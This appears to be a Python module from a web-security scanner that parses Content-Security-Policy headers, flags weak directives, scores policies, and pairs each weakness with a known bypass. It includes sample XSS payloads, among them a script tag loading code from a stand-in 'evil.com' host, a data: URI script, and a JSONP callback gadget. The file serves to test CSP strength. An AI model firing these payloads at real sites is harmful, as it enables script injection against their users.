"""
Content Security Policy (CSP) analysis module.
"""

import re
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from enum import Enum


class CSPSeverity(Enum):
    """CSP issue severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class CSPIssue:
    """CSP policy issue."""
    issue_type: str
    severity: CSPSeverity
    description: str
    directive: Optional[str]
    value: Optional[str]


@dataclass
class CSPBypass:
    """Potential CSP bypass technique."""
    technique: str
    payload: str
    description: str
    success_probability: float


@dataclass
class CSPAnalysis:
    """Complete CSP analysis."""
    is_strict: bool
    bypass_possible: bool
    issues: List[CSPIssue]
    bypasses: List[CSPBypass]
    directives: Dict[str, List[str]]
    raw_csp: str


class CSPAnalyzer:
    """
    Advanced CSP analyzer.
    Analyzes Content-Security-Policy headers for bypass opportunities.
    """

    # Dangerous CSP values: matched exhaustively ('*', 'unsafe-inline', ...) or
    # by scheme prefix ('data:', 'blob:') — never as a raw substring, which
    # would flag every legitimate https:// source because 'http:' in 'https://x'.
    DANGEROUS_VALUES = ['*', 'unsafe-inline', 'unsafe-eval', 'data:', 'blob:', 'http:', 'https:']

    # Required directives for a strong CSP
    REQUIRED_DIRECTIVES = ['default-src', 'script-src']

    # Recommended directives
    RECOMMENDED_DIRECTIVES = ['object-src', 'base-uri', 'form-action', 'frame-ancestors']

    # Known CSP bypass techniques
    BYPASS_TECHNIQUES = {
        'unsafe_inline': {
            'technique': 'unsafe-inline bypass',
            'payload': '<script>alert(1)</script>',
            'description': 'Direct script execution with unsafe-inline',
        },
        'wildcard_origin': {
            'technique': 'Wildcard origin bypass',
            'payload': '<script src="http://evil.com/exploit.js"></script>',
            'description': 'Load scripts from any origin with wildcard',
        },
        'data_uri': {
            'technique': 'data: URI bypass',
            'payload': '<script src="data:text/javascript,alert(1)"></script>',
            'description': 'Execute script from data URI',
        },
        'jsonp_gadget': {
            'technique': 'JSONP gadget bypass',
            'payload': '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&q=test&callback=alert(1)"></script>',
            'description': 'Use JSONP gadget to execute code',
        },
        'angular_cdn': {
            'technique': 'Angular CDN bypass',
            'payload': '{{xss="alert(1)"}}',
            'description': 'Angular template injection with CDN',
        },
        'nonce_reuse': {
            'technique': 'Nonce reuse bypass',
            'payload': '<script nonce="KNOWN_NONCE">alert(1)</script>',
            'description': 'Reuse valid nonce if predictable',
        },
    }

    def __init__(self):
        self._cache: Dict[str, CSPAnalysis] = {}

    def parse_csp(self, csp_header: str) -> Dict[str, List[str]]:
        """Parse a CSP header into directives."""
        directives = {}
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            directive_name = parts[0]
            values = parts[1:] if len(parts) > 1 else []
            directives[directive_name] = values
        return directives

    def analyze_csp(self, csp_header: str) -> CSPAnalysis:
        """
        Analyze a CSP header for security issues.

        Args:
            csp_header: Content-Security-Policy header value

        Returns:
            CSPAnalysis with detailed findings
        """
        if csp_header in self._cache:
            return self._cache[csp_header]

        directives = self.parse_csp(csp_header)
        issues = []
        bypasses = []

        # Check for missing directives
        for required in self.REQUIRED_DIRECTIVES:
            if required not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_directive",
                    severity=CSPSeverity.HIGH,
                    description=f"Missing {required} directive",
                    directive=required,
                    value=None
                ))

        # Check for recommended directives
        for recommended in self.RECOMMENDED_DIRECTIVES:
            if recommended not in directives:
                issues.append(CSPIssue(
                    issue_type="missing_recommended_directive",
                    severity=CSPSeverity.MEDIUM,
                    description=f"Missing {recommended} directive (recommended)",
                    directive=recommended,
                    value=None
                ))

        # Check for dangerous values
        for directive, values in directives.items():
            for value in values:
                matched_dangerous = None
                for dangerous in self.DANGEROUS_VALUES:
                    if dangerous.endswith(':'):
                        # Bare scheme tokens ('data:', 'https:') allow every
                        # resource of that scheme and are dangerous; a concrete
                        # origin such as 'https://cdn.example.com' is not.
                        if value in (dangerous, dangerous + '*'):
                            matched_dangerous = dangerous
                            break
                    elif value == dangerous:
                        matched_dangerous = dangerous
                        break
                if matched_dangerous:
                    issues.append(CSPIssue(
                        issue_type="dangerous_value",
                        severity=CSPSeverity.HIGH,
                        description=f"{directive} contains dangerous value: {matched_dangerous}",
                        directive=directive,
                        value=value
                    ))

                    # Add corresponding bypass
                    if matched_dangerous == 'unsafe-inline':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['unsafe_inline']['technique'],
                            payload=self.BYPASS_TECHNIQUES['unsafe_inline']['payload'],
                            description=self.BYPASS_TECHNIQUES['unsafe_inline']['description'],
                            success_probability=0.9
                        ))
                    elif matched_dangerous == '*':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['wildcard_origin']['technique'],
                            payload=self.BYPASS_TECHNIQUES['wildcard_origin']['payload'],
                            description=self.BYPASS_TECHNIQUES['wildcard_origin']['description'],
                            success_probability=0.8
                        ))
                    elif matched_dangerous == 'data:':
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['data_uri']['technique'],
                            payload=self.BYPASS_TECHNIQUES['data_uri']['payload'],
                            description=self.BYPASS_TECHNIQUES['data_uri']['description'],
                            success_probability=0.7
                        ))

        # Check for JSONP gadget domains
        gadget_domains = ['ajax.googleapis.com', 'cdn.jsdelivr.net', 'cdnjs.cloudflare.com']
        for directive, values in directives.items():
            for value in values:
                for gadget in gadget_domains:
                    if gadget in value:
                        issues.append(CSPIssue(
                            issue_type="jsonp_gadget_domain",
                            severity=CSPSeverity.MEDIUM,
                            description=f"{directive} allows JSONP gadget domain: {gadget}",
                            directive=directive,
                            value=value
                        ))
                        bypasses.append(CSPBypass(
                            technique=self.BYPASS_TECHNIQUES['jsonp_gadget']['technique'],
                            payload=self.BYPASS_TECHNIQUES['jsonp_gadget']['payload'],
                            description=self.BYPASS_TECHNIQUES['jsonp_gadget']['description'],
                            success_probability=0.6
                        ))

        # Determine if bypass is possible
        bypass_possible = len(bypasses) > 0

        # Determine if CSP is strict
        is_strict = not bypass_possible and len(issues) == 0

        analysis = CSPAnalysis(
            is_strict=is_strict,
            bypass_possible=bypass_possible,
            issues=issues,
            bypasses=bypasses,
            directives=directives,
            raw_csp=csp_header
        )

        self._cache[csp_header] = analysis
        return analysis

    def suggest_bypass_payloads(
        self,
        analysis: CSPAnalysis,
        marker: str
    ) -> List[str]:
        """
        Suggest potential CSP bypass payloads.

        Args:
            analysis: CSPAnalysis result
            marker: Unique marker for verification

        Returns:
            List of bypass payloads
        """
        payloads = []

        for bypass in analysis.bypasses:
            payload = bypass.payload.replace('alert(1)', f"window.__xoxss_csp.push('{marker}')")
            payloads.append(payload)

        return payloads

    def calculate_csp_score(self, analysis: CSPAnalysis) -> float:
        """Calculate overall CSP security score (0-1)."""
        if analysis.is_strict:
            return 1.0

        score = 1.0

        # Deduct for missing directives
        for issue in analysis.issues:
            if issue.severity == CSPSeverity.CRITICAL:
                score -= 0.3
            elif issue.severity == CSPSeverity.HIGH:
                score -= 0.2
            elif issue.severity == CSPSeverity.MEDIUM:
                score -= 0.1
            elif issue.severity == CSPSeverity.LOW:
                score -= 0.05

        # Deduct for bypass possibilities
        score -= len(analysis.bypasses) * 0.15

        return max(0.0, round(score, 2))
